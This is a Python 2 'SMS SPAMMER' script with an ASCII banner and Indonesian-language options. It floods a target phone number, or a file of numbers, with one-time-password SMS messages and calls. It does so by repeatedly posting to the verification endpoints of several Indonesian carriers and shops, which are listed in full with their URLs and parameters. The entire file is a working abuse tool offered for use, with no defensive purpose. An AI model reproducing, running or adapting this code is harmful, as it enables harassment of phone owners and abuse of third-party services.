try:
  from sys import argv,exit
  import requests,argparse, os, sys
except ImportError,ie:
  print "Error while importing module %s, Exit."% ie


def bom(url,par,tot,indik,num):
  c=int(0)
  scs=int(0)
  fail=int(0)

  while ( c < int(tot) ):
    req = requests.post(url,data=par)
    
    
    if str(indik) in str(req.text):
      scs+=1
      
    else:
      fail+=1
    
    print '  %s%s%s SMS sent to%s %s%s :%s %s %sSuccess%s and%s %s %sFail \r'% (lYellow,tot,lCyan,lYellow,num,lCyan,lYellow,scs,lGreen,lCyan,lYellow,fail,lRed),
    sys.stdout.flush()
    os.popen('sleep 1')
    c+=1
  return {'sugmaball':scs,'fail':fail}
  

lCyan='\033[96m'
lGreen='\033[92m'
lRed='\033[91m'
lYellow='\033[93m'
white='\033[0m'

def ban():
  print """%s 
                        :####:
                       :######
                       ##:  :#
            %s  .####. %s  ##        ##.###:    :####    ## #:##:
            %s .######. %s ###:      #######:   ######   ########   
            %s ###  ### %s :#####:   ###  ###   #:  :##  ##.##.##   
            %s ##.  .## %s  .#####:  ##.  .##    :#####  ## ## ##   
            %s ##    ## %s     :###  ##    ##  .#######  ## ## ##   
            %s ##.  .## %s       ##  ##.  .##  ## .  ##  ## ## ##
            %s ###  ### %s #:.  :##  ###  ###  ##:  ###  ## ## ##
            %s .######. %s #######:  #######:  ########  ## ## ##
            %s  .####.  %s .#####:   ##.###:     ###.##  ## ## ##
                                 ##
              Author : [M]iZun0  ##  Team : BlackHole Security
              Github/sushiroku1  ##  Version : 1.1.0
              
                       
      %s"""% (lGreen,lRed,lGreen,lRed,lGreen,lRed,lGreen,lRed,lGreen,lRed,lGreen,lRed,lGreen,lRed,lGreen,lRed,lGreen,lRed,lGreen,white)

def aer(m):
  print "\t\t%sError : %s"% (lRed,m)
  print "\t\t%sTry : %s'%s -h'%s for information "% (white,lGreen,argv[0],white)
  exit()
pars= argparse.ArgumentParser(ban(),description="SMS SPAMMER",usage='[-h | --help | --list ] [--nomor NOMOR | --file FILE] [--tipe TIPE ] [ --jumlah JUMLAH ]',epilog="Example : %s --nomor 628xxx --tipe jdid --jumlah 3"% (argv[0]))
pars.error = aer
par=pars.add_argument_group('Single spam')
mul=pars.add_argument_group('Multi spam')
ops=pars.add_argument_group('Spam opt')
mul.add_argument('--file',default=None, help='File berisi list nomor yang akan di spam', type=argparse.FileType('r'))
#op=pars.add_mutually_exclusive_group()
par.add_argument('--nomor',default=None,type=str,help='Nomot target')
ops.add_argument('--jumlah',type=int,default=1,help='Jumlah sms yang akan dikirim, default 1')
pars.add_argument('--list',action='store_true',help='Print list spam yang ada.')

ops.add_argument('--tipe',type=str,help='Tipe spam, ketik "%s --list" untuk melihat tipe spam yang ada.'% argv[0])
arg=pars.parse_args()
try:
  dal= arg.file.read()
except:
  dal=None
numba = arg.nomor or dal
tot = int(arg.jumlah)
tip=str(arg.tipe).upper()
li=arg.list

if __name__=="__main__":
  
  if li == True:
    
    print '''
\t   List spam      Desc                       Penulisan
            
\t    JDID        Semua operator            628xxx/08xxx/8xxx
\t    PHD         Semua operator            628xxx
\t    TOKPEDC     Semua operator (Telp)     628xxx
\t    TOKPEDS     Semua operator (Sms)
\t    TRI         Khusus SC Tri             628xxx/08xxx
\t    ISAT        Khusus SC Indosat         628xxx/08xxx
\t    TSEL        Khusus SC Telkomsel       628xxx

    
    '''
    exit()
  
  elif numba != None:
    for no in numba.split():
      
      slist={
    'JDID':{
        'url':'http://sc.jd.id/phone/sendPhoneSms',
        'par':{'phone':no,'smsType':'1'},
        'idk':'true'
    },
    'TRI':{
        'url':'https://registrasi.tri.co.id/daftar/generateOTP?',
        'par':{'msisdn':no},
        'idk':'success'
    },
    'ISAT':{
        'url':'https://myim3.indosatooredoo.com/registration/verifyMsisdn',
        'par':{'mobilephone':no},
        'idk':'Kami telah mengirimkan kode verifikasi'
    },
    'TSEL':{
        'url':'https://tdwidm.telkomsel.com/passwordless/start',
        'par':{'phone_number':'+'+no,"connection":"call"},
        'idk':'phone_number'
    },
    'TOKPEDC':{
        'url':'https://www.tokocash.com/oauth/otp',
        'par':{'msisdn':no,'accept':'call'},
        'idk':'otp_attempt_left'
    },
    'TOKPEDS':{
        'url':'https://www.tokocash.com/oauth/otp',
        'par':{'msisdn':no,'accept':''},
        'idk':'otp_attempt_left'
    },
    'PHD':{
        'url':'https://www.phd.co.id/en/users/sendOTP',
        'par':{'phone_number':no},
        'idk':'We have sent an OTP to your phone, Please enter the 4 digit code.'
    }
}
      for tipe,val in slist.items():
      
        if tip == tipe:
          bom(val['url'],val['par'],tot,val['idk'],no)
          print
          
        
        
        elif str(tip) not in slist.keys():
        
          aer('Tipe spam "%s" tidak ada'% tip)
          exit()
        